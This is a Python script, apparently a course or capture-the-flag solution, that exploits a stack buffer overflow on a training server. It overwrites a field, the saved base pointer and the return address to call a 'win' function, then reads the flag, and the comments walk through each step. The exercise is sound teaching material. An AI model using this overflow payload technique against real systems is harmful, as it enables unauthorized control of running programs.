import socket

# our goal here is to overwrite the return pointer on the stack
# such that we call `win` with our `return 0`.
# to do this we write out of the bounds of `new_user`,
# overwrite the 8 byte `BFP` and then 8 byte `RET` address (assuming 64-bit system).

# opening the compiled binary with ghidra, we know that the address of
# `win` is 0x00401220 (remember, later we need to encode this in little endian).
# This step is pretty simple, just look for the entry point, you should find your `__libc_start_main` somewhere.
# Then jump to `main` and below that (in our case) `win` is defined!

# open socket to host
s = socket.socket()
s.connect(("itsec.sec.in.tum.de", 7002))
sf = s.makefile("rw")

# read the "Please enter your name:"
print(sf.read(23).strip())

# craft our input:
# we want to fill the 52 bytes of `name`
# then write into the 4 bytes of `birthday`
# and then write into 4 bytes of `is_admin` (little endian).
# then we write into the base stack pointer, 8 bytes
# finally write the 8 bytes of the RET address (little endian!)
input = 52*"A" + 4*"A" + "\1\0\0\0" + 8*"A" + "\x20\x12\x40\x00" + "\x00"*4 + "\n"
print(input.encode())  # debug print to verify for ourselves
sf.write(input)
sf.flush()

print(sf.readline().strip())  # read the name output "Hello ...!"
print(sf.readline().strip())  # read the FLAG

s.close()  # bye bye
